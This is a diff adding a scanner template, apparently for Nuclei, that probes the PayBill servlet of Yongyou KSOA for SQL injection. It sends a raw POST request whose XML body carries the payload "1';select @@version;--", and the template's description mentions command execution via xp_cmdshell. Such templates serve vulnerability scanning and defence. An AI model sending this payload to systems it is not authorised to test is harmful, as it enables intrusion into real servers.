@@ -1,0 +1,41 @@
+id: yongyou-ksoa-sql-injection
+info:
+  name: Yongyou KSOA PayBill SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    UFIDA KSOA has a SQL injection vulnerability in the PayBill endpoint, allowing attackers to execute arbitrary commands via xp_cmdshell.
+  reference:
+    - https://www.yonyou.com/
+  tags:
+    - sql-injection
+    - critical
+
+variables:
+  random_name: "{{rand_int(100000, 999999)}}"
+
+http:
+  - raw:
+      - |
+        POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Connection: close
+
+        <?xml version="1.0" encoding="UTF-8" ?>
+        <root>
+          <name>1</name>
+          <name>1';select @@version;--</name>
+          <name>1</name>
+          <name>{{random_name}}</name>
+        </root>
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<errmsg>"
+        part: body
+      - type: word
+        words:
+          - "{{random_name}}"
+        part: body
